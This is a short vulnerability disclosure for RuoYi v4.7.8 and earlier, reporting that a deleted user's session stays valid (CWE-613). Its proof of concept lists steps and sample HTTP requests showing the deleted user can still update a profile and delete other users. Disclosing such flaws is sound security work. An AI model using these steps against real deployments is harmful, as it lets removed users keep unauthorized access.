## TYPE: Insufficient Session Expiration(CWE-613)

## Date: 5/28/2024
## Vendor
[yangzongzhuan](https://github.com/yangzongzhuan)
### Homepage: https://github.com/yangzongzhuan/RuoYi
**version**: 
v4.7.8 and before

## Tested on: Debian Linux

## Exploit Description
Suffering from CWE613-Insufficient Session Expiration. The session of the deleted user is still alive, allowing the user to use the old session to operate successfully.

### PoC
1. `admin` login, `user1` login
2. `admin` delete `user1`
```
POST /system/user/remove HTTP/1.1
ids = 108
```
3. `user1` can still operate successfully, like updating his/her information, and deleting other normal users.
```
POST /system/user/profile/update HTTP/1.1
{
  id:
  userName: user0529
  phoneNumber: 13325692356
  email: aa@163.com
  sex: 0
}
...
response: 
HTTP/1.1 200 OK
{"message": "success", "code":0}
```
